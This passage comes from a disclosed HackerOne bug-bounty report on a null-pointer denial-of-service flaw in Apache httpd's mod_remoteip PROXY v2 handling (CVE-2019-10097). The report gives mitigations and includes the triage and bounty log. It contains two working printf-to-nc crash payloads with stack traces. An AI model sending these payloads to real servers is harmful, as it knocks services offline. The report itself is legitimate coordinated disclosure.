Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ffff71927e5]\n/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x5c)[0x7ffff723415c]\n/lib/x86_64-linux-gnu/libc.so.6(+0x117160)[0x7ffff7232160]\n/lib/x86_64-linux-gnu/libc.so.6(+0x1164b2)[0x7ffff72314b2]\n/usr/local/apache2/modules/mod_remoteip.so(+0x39e3)[0x7ffff486e9e3]\n/usr/local/apache2/bin/httpd(ap_rgetline_core+0xfa)[0x43843a]\n/usr/local/apache2/bin/httpd(ap_read_request+0x2a6)[0x43b1e6]\n/usr/local/apache2/bin/httpd[0x464b6d]\n/usr/local/apache2/bin/httpd(ap_run_process_connection+0x40)[0x45beb0]\n/usr/local/apache2/bin/httpd[0x470455]\n/usr/local/apache2/bin/httpd[0x471428]\n/lib/x86_64-linux-gnu/libpthread.so.0(+0x76ba)[0x7ffff74ec6ba]\n/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7ffff722241d]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"denial-of-service-from-null-pointer-dereference-handling-proxy-v2\"\u003eDenial of service from null pointer dereference handling PROXY v2\u003c/h2\u003e\n\n\u003cp\u003eIn the \u003ccode\u003eremoteip_input_filter\u003c/code\u003e function it\u0026#39;s assumed that when control flow\u003cbr\u003e\nreaches L1173 that the \u003ccode\u003edone\u003c/code\u003e variable is true and so the \u003ccode\u003econn_conf\u003c/code\u003e has been\u003cbr\u003e\npopulated with the true \u003ccode\u003eclient_ip\u003c/code\u003e and \u003ccode\u003eclient_addr\u003c/code\u003e by the PROXY messages that\u003cbr\u003e\nwere processed to reach the done state. The \u003ccode\u003econn_conf-\u0026gt;client_addr\u003c/code\u003e field is\u003cbr\u003e\nthen dereferenced to log \u003ccode\u003econn_conf-\u0026gt;client_addr-\u0026gt;port\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f-\u0026gt;c, APLOGNO(03511)\n              \u0026quot;RemoteIPProxyProtocol: received valid PROXY header: %s:%hu\u0026quot;,\n              conn_conf-\u0026gt;client_ip, conn_conf-\u0026gt;client_addr-\u0026gt;port);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUnfortunately there is a logic error in this assumption. The\u003cbr\u003e\n\u003ccode\u003eremoteip_process_v2_header\u003c/code\u003e function returns \u003ccode\u003eHDR_DONE\u003c/code\u003e, triggering \u003ccode\u003edone = 1\u003c/code\u003e\u003cbr\u003e\nin two conditions where the \u003ccode\u003econn_conf-\u0026gt;client_addr\u003c/code\u003e remains null, triggering\u003cbr\u003e\na null pointer dereference when \u003ccode\u003econn_conf-\u0026gt;client_addr-\u0026gt;port\u003c/code\u003e is evaluated,\u003cbr\u003e\ncausing the worker thread to segfault.\u003c/p\u003e\n\n\u003cp\u003eThe first condition this can occur is when the \u003ccode\u003ehdr-\u0026gt;v2.fam\u003c/code\u003e indicating the\u003cbr\u003e\naddress family and protocol is unsupported:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    default:\n        /* unsupported protocol, keep local connection address */\n        return HDR_DONE;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe other condition this can occur is when the \u003ccode\u003ehdr-\u0026gt;v2.ver_cmd\u003c/code\u003e\u0026#39;s lower order\u003cbr\u003e\nbits are 0x00, indicating it is a LOCAL command.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e   case 0x00: /* LOCAL command */\n       /* keep local connection address for LOCAL */\n       return HDR_DONE;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe comments in the LOCAL command case potentially indicate that there was an\u003cbr\u003e\nassumption that the addresses were pre-populated and so HDR_DONE could be\u003cbr\u003e\nreturned without error. I believe this code/assumption were adopted from the\u003cbr\u003e\nHAProxy PROXY protocol example code at the end of the specification document[1]\u003cbr\u003e\nwhere the same \u003ccode\u003ecase 0x00\u003c/code\u003e logic and comment can be found. In this example code\u003cbr\u003e\nhowever the \u003ccode\u003esockaddr_storage\u003c/code\u003e for \u003ccode\u003efrom\u003c/code\u003e and \u003ccode\u003eto\u003c/code\u003e are said to have been\u003cbr\u003e\n\u0026quot;already filled by accept()\u0026quot; and \u0026quot;getsockname()\u0026quot;.\u003c/p\u003e\n\n\u003ch3 id=\"example-reproduction\"\u003eExample reproduction\u003c/h3\u003e\n\n\u003cp\u003eThis bug can be triggered with a valid PROXY v2 message using the LOCAL command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprintf \u0026quot;\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x20\\x11\\x00\\x00\u0026quot; | nc localhost 6666\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eStack trace:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThread 3 \u0026quot;httpd\u0026quot; received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17395)]\n0x00007ffff486ebad in remoteip_input_filter (f=0x7fffec037690, bb_out=0x7fffdc003e58, mode=AP_MODE_GETLINE,.\n    block=APR_BLOCK_READ, readbytes=0) at mod_remoteip.c:1248\n    1248        ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f-\u0026gt;c, APLOGNO(03511)\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt can also be triggered with a valid PROXY v2 message using the PROXY command\u003cbr\u003e\nand an unsupported address family/protocol:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprintf \u0026quot;\\x0D\\x0A\\x0D\\x0A\\x00\\x0D\\x0A\\x51\\x55\\x49\\x54\\x0A\\x21\\x00\\x00\\x00\u0026quot; | nc localhost 6666\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eStack trace:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThread 3 \u0026quot;httpd\u0026quot; received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2e0b700 (LWP 17437)]\n0x00007ffff486ebad in remoteip_input_filter (f=0x7fffec037690, bb_out=0x7fffdc003e58, mode=AP_MODE_GETLINE,.\n    block=APR_BLOCK_READ, readbytes=0) at mod_remoteip.c:1248\n    1248        ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f-\u0026gt;c, APLOGNO(03511)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"mitigations\"\u003eMitigations\u003c/h1\u003e\n\n\u003cp\u003eThe Apache \u003ccode\u003emod_remoteip\u003c/code\u003e docs[1] strongly encourages care with what\u003cbr\u003e\nintermediate hosts should be trusted to provide \u003ccode\u003emod_remoteip\u003c/code\u003e inputs:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIt is critical to only enable this behavior from intermediate hosts (proxies,\u003cbr\u003e\netc) which are trusted by this server, since it is trivial for the remote\u003cbr\u003e\nuseragent to impersonate another useragent.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAdministrators that restrict the hosts that can send requests to the\u003cbr\u003e\nVirtualHost/Server with \u003ccode\u003eRemoteIPPRoxyProtocol on\u003c/code\u003e (e.g. through external\u003cbr\u003e\nfirewall policy/network controls) will restrict their exposure\u003cbr\u003e\nto these vulnerabilities.\u003c/p\u003e\n\n\u003cp\u003eUnfortunately unlike the \u003ccode\u003eRemoteIPHeader\u003c/code\u003e directives it is \u003cem\u003enot\u003c/em\u003e possible to\u003cbr\u003e\nconfigure \u003ccode\u003eRemoteIPProxyProtocol on\u003c/code\u003e and whitelist intermediate IP addresses\u003cbr\u003e\n(e.g. like \u003ccode\u003eRemoteIPInternalProxyList\u003c/code\u003e) within the Apache configuration. Thus\u003cbr\u003e\nadministrators must take action above and beyond their Apache configuration to\u003cbr\u003e\nuse this module safely and mitigate the reported vulnerabilities.\u003c/p\u003e\n\n\u003ch1 id=\"applicability-to-mod_proxy_protocol\"\u003eApplicability to mod_proxy_protocol\u003c/h1\u003e\n\n\u003cp\u003eThe core Apache project \u003ccode\u003emod_remoteip\u003c/code\u003e module\u0026#39;s PROXY support was originally\u003cbr\u003e\nadopted from a 3rd party module, \u003ccode\u003emod_proxy_protocol\u003c/code\u003e[2]. All of the\u003cbr\u003e\nvulnerabilities identified in this report are from code shared with the original\u003cbr\u003e\n\u003ccode\u003emod_proxy_protocol\u003c/code\u003e module. Users of this module with other HTTPD versions are\u003cbr\u003e\nequally affected by these vulnerabilities.\u003c/p\u003e\n\n\u003ch1 id=\"references\"\u003eReferences\u003c/h1\u003e\n\n\u003cp\u003e[0] \u003ca title=\"https://httpd.apache.org/docs/2.4/mod/mod_remoteip.html\" href=\"/redirect?url=https%3A%2F%2Fhttpd.apache.org%2Fdocs%2F2.4%2Fmod%2Fmod_remoteip.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://httpd.apache.org/docs/2.4/mod/mod_remoteip.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n[1] \u003ca title=\"https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt\" href=\"/redirect?url=https%3A%2F%2Fwww.haproxy.org%2Fdownload%2F1.8%2Fdoc%2Fproxy-protocol.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.haproxy.org/download/1.8/doc/proxy-protocol.txt\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n[2] \u003ca title=\"https://github.com/roadrunner2/mod-proxy-protocol\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Froadrunner2%2Fmod-proxy-protocol\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/roadrunner2/mod-proxy-protocol\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n[3] \u003ca title=\"https://github.com/apache/httpd/blob/8cfc6007670cf4bcc7129c197dda456e0d5de102/modules/metadata/mod_remoteip.c\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fapache%2Fhttpd%2Fblob%2F8cfc6007670cf4bcc7129c197dda456e0d5de102%2Fmodules%2Fmetadata%2Fmod_remoteip.c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/apache/httpd/blob/8cfc6007670cf4bcc7129c197dda456e0d5de102/modules/metadata/mod_remoteip.c\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe classic stack overflows can lead to memory corruption and the potential for remote code execution.\u003c/p\u003e\n\n\u003cp\u003eTypically the PROXY protocol is used between security contexts: e.g. a front-end web server in a DMZ terminates HTTP/HTTPS and uses the PROXY protocol when forwarding the request to an application server in a different security context with firewall rules protecting access except from the front-end web server. Abusing the PROXY protocol would allow an attacker who has compromised the front-end web server to pivot through code execution on the application server via crafted PROXY request.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":3,"name":"Classic Buffer Overflow"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-07T20:21:09.895Z","allow_singular_disclosure_after":-36065736.882838115,"singular_disclosure_allowed":true,"vote_count":5,"voters":["cryptographer","armansameer","bbbooomr","canikfanatik","acassimiro"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5598652,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ccppuu,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@antenna ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ccppuu\"\u003e@ccppuu\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-18T01:55:53.723Z","updated_at":"2019-08-18T01:55:53.723Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5598654,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-18T01:56:09.290Z","updated_at":"2019-08-18T01:56:09.290Z","cve_ids":["CVE-2019-10097"],"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5598672,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-18T02:16:19.501Z","updated_at":"2019-08-18T02:16:19.501Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5598673,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @ccppuu,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@antenna ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/ccppuu\"\u003e@ccppuu\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-18T02:16:32.148Z","updated_at":"2019-08-18T02:16:32.148Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5600413,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @antenna :-)\n\n\u003e They will let us know the final ruling on this report, and when/if a fix will be implemented. \n\nJust to make sure this is explicit: per the rules of the IBB program these bugs have already been reported to the Apache HTTPD security team, triaged as \"moderate\", and fixed in Apache 2.4.41.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e :-)\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThey will let us know the final ruling on this report, and when/if a fix will be implemented. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eJust to make sure this is explicit: per the rules of the IBB program these bugs have already been reported to the Apache HTTPD security team, triaged as \u0026quot;moderate\u0026quot;, and fixed in Apache 2.4.41.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-18T12:49:57.587Z","updated_at":"2019-08-18T12:49:57.587Z","actor":{"username":"ccppuu","cleared":false,"url":"/ccppuu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J7su3PHKVo6f7cGgVkFJCTjq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5640264,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi folks. Anything I can do to keep this moving forward? I'd like to take this off of my plate of things to track follow-up for. \n\nThanks!","markdown_message":"\u003cp\u003eHi folks. Anything I can do to keep this moving forward? I\u0026#39;d like to take this off of my plate of things to track follow-up for. \u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-22T15:30:22.299Z","updated_at":"2019-08-22T15:30:22.299Z","actor":{"username":"ccppuu","cleared":false,"url":"/ccppuu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J7su3PHKVo6f7cGgVkFJCTjq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5762927,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi again. We're almost at the 30 day mark since I initially submitted this finding to the IBB.\n\nIs this program still operating? Can someone from IBB acknowledge receipt of this report and provide an update?\n\nThanks!","markdown_message":"\u003cp\u003eHi again. We\u0026#39;re almost at the 30 day mark since I initially submitted this finding to the IBB.\u003c/p\u003e\n\n\u003cp\u003eIs this program still operating? Can someone from IBB acknowledge receipt of this report and provide an update?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-09T14:59:09.099Z","updated_at":"2019-09-09T14:59:09.099Z","actor":{"username":"ccppuu","cleared":false,"url":"/ccppuu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J7su3PHKVo6f7cGgVkFJCTjq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5781323,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ccppuu,\n\nSorry for the long delay. IBB is 100% volunteer run project by the [IBB Panel members](https://internetbugbounty.org/#the-panel). We're processing a significant backlog right now, so just haven't gotten to this report yet. We appreciate your patience on this, and we will be in touch.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ccppuu\"\u003e@ccppuu\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry for the long delay. IBB is 100% volunteer run project by the \u003ca href=\"/redirect?url=https%3A%2F%2Finternetbugbounty.org%2F%23the-panel\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eIBB Panel members\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. We\u0026#39;re processing a significant backlog right now, so just haven\u0026#39;t gotten to this report yet. We appreciate your patience on this, and we will be in touch.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-11T17:33:15.803Z","updated_at":"2019-09-11T17:33:15.803Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5781366,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @reed - I can definitely appreciate that volunteers have limited time. Thanks for adding that extra context. I'm happy to be patient knowing it hasn't fallen between the cracks.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/reed\"\u003e@reed\u003c/a\u003e - I can definitely appreciate that volunteers have limited time. Thanks for adding that extra context. I\u0026#39;m happy to be patient knowing it hasn\u0026#39;t fallen between the cracks.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-11T17:42:21.258Z","updated_at":"2019-09-11T17:42:21.258Z","actor":{"username":"ccppuu","cleared":false,"url":"/ccppuu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J7su3PHKVo6f7cGgVkFJCTjq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5989562,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-08T20:20:52.101Z","updated_at":"2019-10-08T20:20:52.101Z","actor":{"url":"/ibb-apache","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/026/1019d58a547964cedd75cda5809332316a7e381c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Apache httpd (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-apache","collaborator":{"username":"ccppuu","url":"/ccppuu"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5989563,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for helping keep the Internet safe!","markdown_message":"\u003cp\u003eThanks for helping keep the Internet safe!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-08T20:21:03.565Z","updated_at":"2019-10-08T20:21:03.565Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"ccppuu","url":"/ccppuu"},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5989564,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-08T20:21:09.823Z","updated_at":"2019-10-08T20:21:09.823Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6245388,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-07T20:21:13.310Z","updated_at":"2019-11-07T20:21:13.310Z","actor":{"url":"/ibb-apache","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/026/1019d58a547964cedd75cda5809332316a7e381c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Apache httpd (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-apache","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}